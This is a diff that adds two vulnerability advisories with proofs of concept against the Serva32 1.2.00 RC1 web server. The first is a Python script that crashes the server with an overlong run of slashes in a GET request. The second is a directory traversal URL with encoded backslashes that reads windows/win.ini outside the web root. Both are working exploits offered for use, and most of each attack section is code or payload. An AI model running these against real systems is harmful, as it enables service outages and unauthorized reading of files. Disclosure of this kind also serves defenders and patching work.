@@ -1,0 +1,58 @@
+# ------------------------------------------------------------------------
+# Software................Serva32 1.2.00 RC1
+# Vulnerability...........Denial Of Service
+# Threat Level............Serious (3/5)
+# Download................http://www.vercot.com/~serva/
+# Discovery Date..........5/7/2011
+# Tested On...............Windows Vista + XAMPP
+# ------------------------------------------------------------------------
+# Author..................AutoSec Tools
+# Site....................http://www.autosectools.com/
+# Email...................John Leitch <john@autosectools.com>
+# ------------------------------------------------------------------------
+# 
+# 
+# --Description--
+# 
+# A denial of service vulnerability can be exploited to crash Serva32
+# 1.2.00 RC1.
+# 
+# 
+# --PoC--
+
+import socket
+
+host = 'localhost'
+port = 80
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect((host, port))
+s.settimeout(8)    
+
+s.send('GET ' + '/' * 4096 + ' HTTP/1.1\r\n'
+       'Host: localhost\r\n\r\n')
+
+
+------------------------------------------------------------------------
+Software................Serva32 1.2.00 RC1
+Vulnerability...........Directory Traversal
+Threat Level............Serious (3/5)
+Download................http://www.vercot.com/~serva/
+Discovery Date..........5/7/2011
+Tested On...............Windows Vista + XAMPP
+------------------------------------------------------------------------
+Author..................AutoSec Tools
+Site....................http://www.autosectools.com/
+Email...................John Leitch <john@autosectools.com>
+------------------------------------------------------------------------
+
+
+--Description--
+
+A directory traversal vulnerability in Serva32 1.2.00 RC1 can be
+exploited to read files outside of the web root.
+
+
+--PoC--
+
+http://localhost/..%5C/..%5C/..%5C/..%5C/..%5C/..%5C/..%5C/..%5C/windows/win.ini
